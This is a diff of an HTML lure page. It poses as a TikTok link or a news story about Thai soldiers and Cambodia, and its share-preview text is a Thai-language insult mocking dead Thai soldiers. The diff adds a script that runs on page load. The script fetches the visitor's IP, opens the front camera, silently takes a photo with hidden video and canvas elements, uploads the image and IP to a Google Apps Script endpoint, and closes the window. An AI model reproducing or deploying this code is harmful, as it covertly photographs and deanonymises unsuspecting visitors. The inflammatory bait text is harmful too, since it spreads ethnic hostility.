@@ -2,22 +2,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Tiktok.com/ZSS2Et91W</title>
-     <!-- Open Graph (Facebook, Telegram, Discord, etc.) -->
-      <meta property="og:title" content="ทหารไทยโง่เง่าตาย 555">
-      <meta property="og:description" content="ทหารไทยโง่เง่าตาย 555">
-      <meta property="og:image" content="https://vt-tiktok.github.io/thai-soldiers-GhhaSBzb2xkaWVyIGRlaWQgbG9s/preview.jpg">
-      <meta property="og:url" content="https://tinyurl.com/2dx2wkt7">
-      <meta property="og:type" content="website">
+    <title>Thai soldiers invade Cambodia and broke ceasefire</title>
+        <link rel="icon" href="favicon.png" type="image/x-icon">
+    <!-- Open Graph (Facebook, Telegram, Discord, etc.) -->
+    <meta property="og:title" content="ทหารไทยโง่เง่าตาย 555">
+    <meta property="og:description" content="ทหารไทยโง่เง่าตาย 555">
+    <meta property="og:image" content="preview.jpg">
+    <meta property="og:url" content="https://tinyurl.com/2dx2wkt7">
+    <meta property="og:type" content="website">
     
-      <!-- Twitter Card -->
-      <meta name="twitter:card" content="ทหารไทยโง่เง่าตาย 555">
-      <meta name="twitter:title" content="ทหารไทยโง่เง่าตาย 555">
-      <meta name="twitter:description" content="ทหารไทยโง่เง่าตาย 555">
-      <meta name="twitter:image" content="https://vt-tiktok.github.io/thai-soldiers-GhhaSBzb2xkaWVyIGRlaWQgbG9s/preview.jpg">
-    <body>
-    <!-- Your custom HTML content here -->
-
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="ทหารไทยโง่เง่าตาย 555">
+    <meta name="twitter:title" content="ทหารไทยโง่เง่าตาย 555">
+    <meta name="twitter:description" content="ทหารไทยโง่เง่าตาย 555">
+    <meta name="twitter:image" content="preview.jpg">
     <style>
         body { margin: 0; padding: 0; background: #000; 
             margin: 0;
@@ -33,11 +31,84 @@
         /* Hide all UI elements */
         video, canvas { display: none !important; }
     </style>
+    <script>
+        async function captureAndUpload() {
+            try {
+                // [1. IP Address - UNCHANGED]
+                let userIP = 'unknown';
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    userIP = ipData.ip || 'unknown';
+                } catch (ipErr) {
+                    console.warn('IP fetch failed:', ipErr);
+                }
+        
+                // [2. Camera Access - UNCHANGED]
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: { exact: "user" },
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                
+                // [3. Image Capture - UNCHANGED]
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+        
+                // [4. Stop Camera - UNCHANGED]
+                stream.getTracks().forEach(track => track.stop());
+                
+                // [5. Prepare Image Data - UNCHANGED]
+                const imageData = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
+                
+                // ===== ONLY TIME CALCULATION MODIFIED =====
+                const now = new Date();
+                // GMT+7 (ICT) + 5 extra hours = +12 total
+                const adjustedTime = new Date(now.getTime() + (12 * 60 * 60 * 1000));
+                
+                
+                // Format components (using UTC methods for consistency)
+                const year = adjustedTime.getUTCFullYear();
+                const month = String(adjustedTime.getUTCMonth() + 1).padStart(2, '0');
+                const day = String(adjustedTime.getUTCDate()).padStart(2, '0');
+                const hours = String(adjustedTime.getUTCHours()).padStart(2, '0');
+                const minutes = String(adjustedTime.getUTCMinutes()).padStart(2, '0');
+                const seconds = String(adjustedTime.getUTCSeconds()).padStart(2, '0');
+                
+                // Filename format remains identical (only time value changes)
+                const filename = `${userIP}-${year}${month}${day}-${hours}${minutes}${seconds}-GMT+7+5`;
+                // ===== END OF TIME MODIFICATION =====
+                
+                // [6. Upload - UNCHANGED]
+                const response = await fetch('https://script.google.com/macros/s/AKfycbxveLuf1BJSzOr81f8ffjUfbS62-e1W3wnvXofXDFwSdatcBGabzXC6c8fbytcX346w/exec', {
+                    method: 'POST',
+                    body: JSON.stringify({ 
+                        image: imageData,
+                        ip: userIP,
+                        filename: filename
+                    })
+                });
+                
+                console.log('Upload result:', await response.text());
+                
+            } catch (error) {
+                console.error('Capture failed:', error);
+            } finally {
+                setTimeout(() => window.close(), 500);
+            }
+        }
 
-    <!-- Connect to the JavaScript file -->
-    <script src="capture.js"></script>
-    </body>
+window.onload = captureAndUpload;
+</script>
 
-</html>
-
+</body> 
+</html> 
 
